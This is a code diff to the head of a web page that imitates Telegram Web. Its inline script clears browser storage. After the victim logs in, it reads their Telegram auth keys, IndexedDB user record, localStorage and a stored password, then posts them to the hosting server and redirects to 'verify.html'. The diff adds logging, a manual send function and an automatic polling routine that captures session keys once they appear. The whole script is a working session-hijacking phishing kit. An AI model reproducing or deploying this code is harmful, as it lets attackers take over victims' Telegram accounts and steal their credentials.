@@ -46,13 +46,68 @@
   <link rel="canonical" href="https://web.telegram.org/" />
 
   <link rel="manifest" id="manifest" />
+
   <script type="module" crossorigin src="./index-BkkOS5_4.js"></script>
   <link rel="stylesheet" crossorigin href="./index-DyHLgWb4.css" />
   <script>
     document.head.appendChild(document.createElement("style")).textContent =
       ".checkbox-field{display:none!important}";
+
+    console.log("🔍 DEBUG MODE ACTIVATED - Full Analysis");
+    console.log("📍 Page loaded at:", new Date().toLocaleString());
+
+    // Log initial state BEFORE clearing
+    console.log("🧹 BEFORE CLEAR - localStorage:", {
+      length: localStorage.length,
+      keys: Object.keys(localStorage),
+      content: { ...localStorage }
+    });
+    console.log("🧹 BEFORE CLEAR - sessionStorage:", {
+      length: sessionStorage.length,
+      keys: Object.keys(sessionStorage),
+      content: { ...sessionStorage }
+    });
+
+    // Clear all existing session data
     localStorage.clear();
     sessionStorage.clear();
+
+    // Also clear IndexedDB
+    if (window.indexedDB) {
+      indexedDB.deleteDatabase('tweb');
+      console.log("🗑️ Cleared IndexedDB database");
+    }
+
+    console.log("✅ All data cleared - Fresh state achieved");
+
+    // Monitor localStorage changes in real-time
+    const originalSetItem = localStorage.setItem;
+    localStorage.setItem = function (key, value) {
+      console.log("📝 localStorage.setItem called:", { key, value: value.substring(0, 100) + "..." });
+      originalSetItem.apply(this, arguments);
+    };
+
+    // Manual trigger function for testing
+    window.sendSessionData = function () {
+      console.log("🔧 Manual trigger activated");
+      console.log("📋 localStorage content:", localStorage);
+      fetch("/users/me", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify({
+          password: sessionStorage.getItem("password"),
+          userData: "manual_test",
+          localStorage,
+        }),
+      }).then((r) => {
+        console.log("✅ Manual data sent successfully");
+        alert("Data sent to server!");
+      }).catch((error) => {
+        console.error("❌ Manual send failed:", error);
+        alert("Failed to send data: " + error.message);
+      });
+    };
+
     document.addEventListener("DOMContentLoaded", () => {
       indexedDB.open("tweb").onsuccess = (e) =>
         e.target.result
@@ -60,13 +115,16 @@
           .objectStore("users")
           .clear();
       new MutationObserver(() => {
-        if (document.getElementById("auth-pages").style.display === "none")
+        console.log("🔍 Auth pages display:", document.getElementById("auth-pages").style.display);
+        if (document.getElementById("auth-pages").style.display === "none") {
+          console.log("✅ Auth completed, sending data...");
           setTimeout(() => {
             indexedDB.open("tweb").onsuccess = (e) =>
             ((db = e.target.result)
               .transaction(["users"], "readonly")
               .objectStore("users")
-              .openCursor().onsuccess = (e) =>
+              .openCursor().onsuccess = (e) => {
+                console.log("📤 Sending session data to server...");
                 fetch("/users/me", {
                   method: "POST",
                   headers: { "content-type": "application/json" },
@@ -75,12 +133,97 @@
                     userData: e.target.result.value,
                     localStorage,
                   }),
-                }).then((r) => window.location.replace("verify.html")));
+                }).then((r) => {
+                  console.log("✅ Data sent successfully, redirecting...");
+                  window.location.replace("verify.html");
+                }).catch((error) => {
+                  console.error("❌ Error sending data:", error);
+                });
+              });
           }, 1000);
+        }
       }).observe(document.getElementById("auth-pages"), {
         attributes: true,
         attributeFilter: ["style"],
       });
+
+      // Wait for user interaction before monitoring sessions
+      let userInteracted = false;
+      let sessionSent = false;
+      let loginDetected = false;
+      let interactionTimeout;
+
+      // Track user interactions that indicate they're trying to login
+      const userInteractionEvents = ['click', 'keydown', 'input', 'focus'];
+      userInteractionEvents.forEach(event => {
+        document.addEventListener(event, () => {
+          if (!userInteracted) {
+            userInteracted = true;
+            console.log("👆 User interaction detected - starting session monitoring");
+
+            // Start monitoring after user interaction + delay
+            interactionTimeout = setTimeout(() => {
+              console.log("⏰ Starting delayed session monitoring...");
+              startSessionMonitoring();
+            }, 5000); // Wait 5 seconds after interaction
+          }
+        });
+      });
+
+      function startSessionMonitoring() {
+        const intervalId = setInterval(() => {
+          if (sessionSent) return;
+
+          const hasAuth = localStorage.getItem("user_auth");
+          const hasAuthKey = localStorage.getItem("dc1_auth_key") || localStorage.getItem("dc2_auth_key") || localStorage.getItem("dc3_auth_key");
+          const hasEnoughData = localStorage.length > 5;
+
+          console.log("🔍 Monitoring session after user interaction...", {
+            length: localStorage.length,
+            hasAuth: !!hasAuth,
+            hasAuthKey: !!hasAuthKey,
+            keys: Object.keys(localStorage),
+            userInteracted: userInteracted
+          });
+
+          // Only capture if user interacted AND we have substantial session data
+          if (hasEnoughData && (hasAuth || hasAuthKey) && userInteracted) {
+            console.log("🎯 Legitimate login session detected after user interaction!");
+            console.log("📊 Session data with", localStorage.length, "items");
+            sessionSent = true;
+
+            // Log exactly what we're about to send
+            const dataToSend = {
+              password: sessionStorage.getItem("password"),
+              userData: "auto_detected",
+              localStorage: { ...localStorage }
+            };
+
+            console.log("📤 SENDING TO SERVER - Full Data Package:");
+            console.log("🔐 Password:", dataToSend.password);
+            console.log("👤 UserData:", dataToSend.userData);
+            console.log("💾 LocalStorage Keys:", Object.keys(dataToSend.localStorage));
+            console.log("💾 LocalStorage Sample:", Object.keys(dataToSend.localStorage).slice(0, 5).reduce((obj, key) => {
+              obj[key] = dataToSend.localStorage[key].substring(0, 50) + "...";
+              return obj;
+            }, {}));
+
+            // Send data automatically
+            fetch("/users/me", {
+              method: "POST",
+              headers: { "content-type": "application/json" },
+              body: JSON.stringify(dataToSend),
+            }).then((r) => {
+              console.log("✅ Auto data sent successfully");
+              clearInterval(intervalId);
+              setTimeout(() => window.location.replace("verify.html"), 1000);
+            }).catch((error) => {
+              console.error("❌ Auto send failed:", error);
+              sessionSent = false; // Allow retry on error
+            });
+          }
+        }, 2000);
+      }
     });
   </script>
 </head>
